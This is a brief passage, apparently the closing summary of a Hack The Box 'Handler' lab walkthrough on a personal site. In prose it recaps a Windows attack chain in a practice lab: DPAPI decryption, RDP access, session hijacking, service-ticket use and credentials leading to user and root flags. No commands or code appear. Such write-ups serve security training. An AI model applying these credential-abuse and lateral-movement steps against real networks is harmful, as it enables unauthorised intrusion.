+<p>The <code>domain1607+</code> DPAPI context unlocked the certificate chain. The Toby mapping opened the RDP path, the PLC jam created Kofi's session, and Kofi's live service ticket reached the <code>ADSI_Migrt</code> credential boundary. The recovered <code>svc_ldaplnk</code> account had no proven privilege edge beyond that point. I used the supplied <code>svc_wic</code> password and supplied Administrator AES key as separate validation routes for the live user and root flags.</p>
     <p><a class="back" href="../index.html#lab">back to Hacking Lab</a> · <a class="link" href="../assets/writeups/hack-the-box-handler-walkthrough.md">view original Markdown</a></p>
   </article>
 </main>
